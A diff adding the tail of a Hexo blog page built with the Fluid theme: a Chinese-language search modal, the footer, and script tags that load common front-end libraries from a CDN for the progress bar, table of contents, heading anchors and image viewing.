+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
